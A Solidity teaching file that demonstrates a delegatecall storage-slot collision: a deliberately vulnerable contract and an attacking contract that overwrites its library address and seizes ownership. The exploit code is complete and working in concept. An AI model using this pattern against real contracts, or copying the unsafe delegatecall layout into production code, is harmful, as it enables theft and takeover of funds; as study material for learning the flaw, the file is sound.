// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

/*
Again, we are taking advantage of a poorly coded contract that 
uses delegatecall. The state variables are not defined in the same 
manner in Lib and HackableContract. And because delegatecall uses 
slots to determine the SV to update when executing code, there is 
a way for us to become the owner of HackableContract.

See ReadPrivate.sol for an understanding of how SV work.
*/

contract Lib {
    uint256 public number;

    function doSomething(uint256 _number) public {
        number = _number;
    }
}

contract HackableContract {
    // slot 0
    address public lib;
    // slot 1
    address public owner;
    // slot 2
    uint256 public number;

    constructor(address _lib) {
        lib = _lib;
        owner = msg.sender;
    }

    function doSomething(uint256 _number) public {
        lib.delegatecall(
            abi.encodeWithSignature("doSomething(uint256)", _number)
        );
    }
}

contract AttackingContract {
    // we need to declare the same SV, in the same order from HackableContract
    // to make sure we update the correct SV
    // slot 0
    address public lib;
    // slot 1
    address public owner;
    // slot 2
    uint256 public number;
    // slot 3
    HackableContract public hackableContract;

    constructor(HackableContract _hackableContract) {
        hackableContract = HackableContract(_hackableContract);
    }

    function attack() public {
        // change lib address in HackableContract to this contract's address
        hackableContract.doSomething(uint256(uint160(address(this))));
        // now this is calling our malicious doSomehting function
        // and making this contract the owner of HackableContract
        hackableContract.doSomething(1);
    }

    function doSomething(uint256 _number) public {
        // Attack -> HackableContract: delegatecall -> Attack
        //           msg.sender = AttackingContract    msg.sender = AttackingContract
        owner = msg.sender;
    }
}
